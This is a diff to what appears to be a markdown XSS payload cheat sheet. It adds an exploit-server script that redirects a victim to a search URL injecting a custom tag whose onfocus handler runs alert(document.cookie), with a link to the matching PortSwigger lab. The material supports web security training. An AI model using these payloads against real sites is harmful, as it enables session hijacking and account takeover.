@@ -194,8 +194,15 @@ Payloads:
 ```html
 <xss id=a1 onfocus=alert(document.cookie) tabindex=1>#a1
 ```
+For exploit server: 
+```html
+<script>
+location = 'https://vulnweb.net/?search=%3Ccustom-tag+tabindex%3D%221%22+onfocus%3D%27alert(document.cookie)%27+id%3D%22a1%22%3E#a1';
+</script>
+```
+**Portswigger Lab**
 
----
+- [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
 
 ## Reflected XSS with Some SVG Markup Allowed
 ```html
